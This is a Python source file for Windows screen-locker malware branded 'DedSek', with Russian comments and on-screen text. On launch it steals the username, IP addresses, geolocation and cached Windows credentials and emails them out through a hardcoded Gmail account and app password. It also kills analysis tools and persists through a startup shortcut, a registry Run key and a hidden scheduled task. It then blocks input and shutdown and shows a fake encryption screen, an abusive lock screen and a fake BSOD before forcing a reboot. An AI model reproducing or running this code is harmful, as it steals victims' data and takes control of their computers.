import ctypes
import os
import sys
import time
import threading
import tempfile
import tkinter as tk
from tkinter import PhotoImage
import shutil
import winshell
from win32com.client import Dispatch
import base64
import random
import socket
import subprocess
import json
import urllib.request
import urllib.parse
import smtplib
from email.mime.text import MIMEText

# ============================================================
# >>> НАСТРОЙКИ <<<
PASSWORD = "1601"
MAX_ATTEMPTS = 10
SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"

# Gmail
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
# ============================================================

attempts_left = MAX_ATTEMPTS

# ========== СТИЛЕР ДАННЫХ ==========
def steal_data():
    try:
        data = {}
        data["username"] = os.environ.get("USERNAME", "Unknown")
        data["hostname"] = socket.gethostname()
        try:
            data["local_ip"] = socket.gethostbyname(socket.gethostname())
        except:
            data["local_ip"] = "Unknown"
        try:
            data["public_ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        except:
            data["public_ip"] = "Unknown"
        try:
            geo = urllib.request.urlopen(f"http://ip-api.com/json/{data['public_ip']}", timeout=5).read().decode()
            geo_json = json.loads(geo)
            data["country"] = geo_json.get("country", "Unknown")
            data["city"] = geo_json.get("city", "Unknown")
            data["isp"] = geo_json.get("isp", "Unknown")
        except:
            data["country"] = "Unknown"
            data["city"] = "Unknown"
            data["isp"] = "Unknown"
        try:
            result = subprocess.check_output("cmdkey /list", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            data["cached_credentials"] = result[:500] if result else "None"
        except:
            data["cached_credentials"] = "None"

        message = f"""Subject: 🔥 DedSek Logger - {data['username']}

👤 ПОЛЬЗОВАТЕЛЬ: {data['username']}
💻 КОМПЬЮТЕР: {data['hostname']}
🌐 ЛОКАЛЬНЫЙ IP: {data['local_ip']}
🌍 ВНЕШНИЙ IP: {data['public_ip']}
📍 СТРАНА: {data['country']}
🏙 ГОРОД: {data['city']}
📡 ПРОВАЙДЕР: {data['isp']}

🔑 КЭШ ПАРОЛЕЙ WINDOWS:
{data['cached_credentials']}

🕒 ВРЕМЯ: {time.strftime('%d.%m.%Y %H:%M:%S')}"""

        send_email(message)
    except:
        pass

def send_email(message):
    try:
        msg = MIMEText(message, 'plain', 'utf-8')
        msg['Subject'] = f'DedSek Logger - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M")}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=15)
        server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
    except:
        pass

# ========== АНТИ-ОТЛАДКА ==========
def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
        suspicious = ["wireshark.exe", "procmon.exe", "processhacker.exe", 
                     "taskmgr.exe", "regedit.exe", "msconfig.exe"]
        for proc in suspicious:
            os.system(f"taskkill /f /im {proc} >nul 2>&1")
    except:
        pass

# ========== СКРЫТИЕ ПРОЦЕССА ==========
def hide_process():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

# ========== АВТОЗАГРУЗКА ==========
def add_to_startup():
    try:
        current_path = os.path.abspath(__file__)
        pyw_path = os.path.splitext(current_path)[0] + ".pyw"
        if not current_path.endswith(".pyw"):
            try:
                shutil.copy2(current_path, pyw_path)
            except:
                pass
            current_path = pyw_path
        
        startup_folder = winshell.startup()
        shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
        shortcut.Arguments = '"' + current_path + '"'
        shortcut.WorkingDirectory = os.path.dirname(current_path)
        shortcut.IconLocation = "shell32.dll,13"
        shortcut.save()
        
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, 
                            f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{current_path}"')
            winreg.CloseKey(key)
        except:
            pass
        
        try:
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Hidden>true</Hidden><Enabled>true</Enabled></Settings>
  <Actions><Exec>
    <Command>{sys.executable.replace("python.exe", "pythonw.exe")}</Command>
    <Arguments>"{current_path}"</Arguments>
  </Exec></Actions>
</Task>'''
            task_path = os.path.join(tempfile.gettempdir(), "task.xml")
            with open(task_path, "w", encoding="utf-16") as f:
                f.write(task_xml)
            subprocess.run(f'schtasks /create /tn "WindowsUpdateTask" /xml "{task_path}" /f', 
                         shell=True, capture_output=True)
            os.remove(task_path)
        except:
            pass
    except:
        pass

# ========== БЛОКИРОВКА ВВОДА ==========
def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
    except:
        pass

# ========== БЛОКИРОВКА ВСЕХ КЛАВИШ ==========
def block_all_keys():
    try:
        import keyboard
        all_combos = [
            'alt+f4', 'alt+tab', 'alt+esc', 'alt+space',
            'ctrl+shift+esc', 'ctrl+alt+del', 'ctrl+esc',
            'ctrl+w', 'ctrl+f4', 'ctrl+tab',
            'win', 'win+d', 'win+r', 'win+e', 'win+l',
            'win+m', 'win+tab', 'win+x', 'win+u',
            'alt', 'ctrl', 'shift', 'f11',
            'print screen', 'alt+print screen'
        ]
        for combo in all_combos:
            try:
                keyboard.add_hotkey(combo, lambda: None, suppress=True, timeout=0)
            except:
                pass
        block_keys = ['f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
                     'print screen','scroll lock','pause']
        for key in block_keys:
            try:
                keyboard.block_key(key)
            except:
                pass
    except:
        pass

# ========== УБИЙЦА ПРОЦЕССОВ ==========
def kill_processes():
    kill_list = [
        "taskmgr.exe", "cmd.exe", "powershell.exe", "msconfig.exe",
        "regedit.exe", "procexp.exe", "procmon.exe", "processhacker.exe",
        "wireshark.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe"
    ]
    while True:
        try:
            for proc in kill_list:
                os.system(f"taskkill /f /im {proc} >nul 2>&1")
        except:
            pass
        time.sleep(0.05)

# ========== ЗАЩИТА ОТ ВЫКЛЮЧЕНИЯ ==========
def prevent_shutdown():
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(
            ctypes.windll.kernel32.GetConsoleWindow(), 
            "Windows Update in progress..."
        )
    except:
        pass

# ========== СИНИЙ ЭКРАН СМЕРТИ ==========
def show_bsod():
    try:
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        bsod = tk.Tk()
        bsod.attributes('-fullscreen', True)
        bsod.attributes('-topmost', True)
        bsod.configure(bg='#0000AA')
        bsod.overrideredirect(True)
        bsod.focus_force()
        bsod.grab_set()
        
        lbl = tk.Label(bsod, text="", bg='#0000AA', fg='white',
                       font=('Lucida Console', 13))
        lbl.pack(expand=True, padx=40)
        
        bsod_text = """A problem has been detected and Windows has been shut down to prevent damage
to your computer.

ENCRYPTION_FAILED.SYS

PAGE_FAULT_IN_NONPAGED_AREA

If this is the first time you've seen this stop error screen,
restart your computer. If this screen appears again, follow
these steps:

Check to make sure any new hardware or software is properly installed.
If this is a new installation, ask your hardware or software manufacturer
for any Windows updates you might need.

If problems continue, disable or remove any newly installed hardware
or software. Disable BIOS memory options such as caching or shadowing.
If you need to use Safe Mode to remove or disable components, restart
your computer, press F8 to select Advanced Startup Options, and then
select Safe Mode.

Technical information:

*** STOP: 0x00000050 (0xFFFFF880009A3B28, 0x0000000000000001, 0xFFFFF80002A7C5B1, 0x0000000000000002)

*** ENCRYPTION_FAILED.SYS - Address FFFFF80002A7C5B1 base at FFFFF80002A0D000, DateStamp 5d4a1f8c

Physical memory dump FAILED with status 0xC000009C
Contact your system administrator or technical support group for further
assistance."""
        
        lbl.config(text=bsod_text)
        bsod.update()
        for i in range(30):
            try:
                ctypes.windll.user32.BlockInput(True)
            except:
                pass
            bsod.update()
            time.sleep(1)
        os.system("shutdown /r /t 0 /f")
        os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f")
        os._exit(0)

# ========== АНИМАЦИЯ ЗАГРУЗКИ ==========
def boot_animation():
    anim = tk.Tk()
    anim.attributes('-fullscreen', True)
    anim.attributes('-topmost', True)
    anim.configure(bg='black')
    anim.overrideredirect(True)
    anim.focus_force()
    anim.grab_set()
    
    lbl = tk.Label(anim, text="", bg='black', fg='white',
                   font=('Courier', 20, 'bold'))
    lbl.pack(expand=True)
    
    for i in range(8):
        if i % 2 == 0:
            anim.configure(bg='white')
            lbl.config(bg='white', fg='black')
        else:
            anim.configure(bg='black')
            lbl.config(bg='black', fg='white')
        anim.update()
        time.sleep(0.2)
    
    anim.configure(bg='black')
    lbl.config(bg='black', fg='#00FF00')
    anim.attributes('-alpha', 0.0)
    
    for alpha in range(0, 110, 5):
        anim.attributes('-alpha', alpha/100)
        lbl.config(text="DedSek тебя взломали")
        anim.update()
        time.sleep(0.03)
    
    anim.attributes('-alpha', 1.0)
    time.sleep(1.5)
    
    progress = [
        "Идет шифровка данных...",
        "[                    ] 0%",
        "[##                  ] 10%",
        "[####                ] 20%",
        "[######              ] 30%",
        "[########            ] 40%",
        "[##########          ] 50%",
        "[############        ] 60%",
        "[##############      ] 70%",
        "[################    ] 80%",
        "[##################  ] 90%",
        "[####################] 100%",
        "",
        "ДАННЫЕ УСПЕШНО ЗАШИФРОВАНЫ!"
    ]
    
    for msg in progress:
        lbl.config(text=msg)
        anim.update()
        time.sleep(0.25)
    
    time.sleep(1)
    anim.destroy()

# ========== ОСНОВНОЙ ЭКРАН ==========
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.focus_force()
        self.win.grab_set()
        
        global attempts_left
        
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            skull_img = PhotoImage(file=img_path)
            lbl_img = tk.Label(self.win, image=skull_img, bg='black')
            lbl_img.image = skull_img
            lbl_img.place(relx=0.5, rely=0.08, anchor='center')
        except:
            pass
        
        msg = """ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!

ИДИ ЛАПУ СОСИ

ТЫ ДУМАЕШЬ ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ, НЕ ЗНАЕШЬ!

ТЫ ДУМАЕШЬ 123 ИЛИ 123456789 ИЛИ 0000000 И Т.Д.? НЕТ!

ПАРОЛЬ ПОЛНОСТЬЮ ЗАШИФРОВАН, НО Я НЕ ВЫМОГАТЕЛЬ
ТЫ БУДЕШЬ САМ РАЗГАДЫВАТЬ!

1. standard DES
$1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/

2. Bcrypt
$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e

3. Base64
MTI0Njk4ODA0

4. standard DES
$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1

5. uuEncode
+.3@P-C

ЕСЛИ ЧТО, ВСЕ ПАРОЛИ РАЗНЫЕ, НО 1 ВЕРНЫЙ
УДАЧИ, ДРУГ

КСТАТИ, У ТЕБЯ 10 ПОПЫТОК!"""
        
        lbl_msg = tk.Label(self.win, text=msg, bg='black', fg='#00FF00',
                           font=('Courier', 10, 'bold'), justify='left')
        lbl_msg.place(relx=0.5, rely=0.48, anchor='center')
        
        center_frame = tk.Frame(self.win, bg='black')
        center_frame.place(relx=0.5, rely=0.88, anchor='center')
        
        tk.Label(center_frame, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00',
                 font=('Courier', 16, 'bold')).pack(pady=(0, 5))
        
        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 16, 'bold'),
                              bg='black', fg='#00FF00', insertbackground='#00FF00',
                              relief='solid', bd=2)
        self.entry.pack(pady=(0, 5), ipadx=50, ipady=5)
        
        self.status = tk.Label(center_frame, text=f"ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
                               bg='black', fg='#FF0000',
                               font=('Courier', 14, 'bold'))
        self.status.pack()
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_force()
        self.win.after(100, self.keep_focus)
    
    def keep_focus(self):
        try:
            self.win.focus_force()
            self.entry.focus_force()
            self.win.after(100, self.keep_focus)
        except:
            pass
    
    def check_password(self, event=None):
        global attempts_left
        
        if self.entry.get() == PASSWORD:
            self.status.config(text="ВЕРНО! РАЗБЛОКИРОВКА...", fg='#00FF00')
            self.win.update()
            time.sleep(1)
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.status.config(text=f"НЕВЕРНО! ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
                                  fg='#FF0000')
            else:
                self.status.config(text="ПОПЫТКИ ИСТРАЧЕНЫ! BSoD...", fg='#FF0000')
                self.win.update()
                time.sleep(2)
                self.root.destroy()
                show_bsod()
            self.entry.delete(0, tk.END)

# ========== ТОЧКА ВХОДА ==========
if __name__ == "__main__":
    anti_debug()
    hide_process()
    threading.Thread(target=steal_data, daemon=True).start()
    add_to_startup()
    boot_animation()
    block_input(True)
    prevent_shutdown()
    threading.Thread(target=kill_processes, daemon=True).start()
    threading.Thread(target=block_all_keys, daemon=True).start()
    WinLocker()
    tk.mainloop()
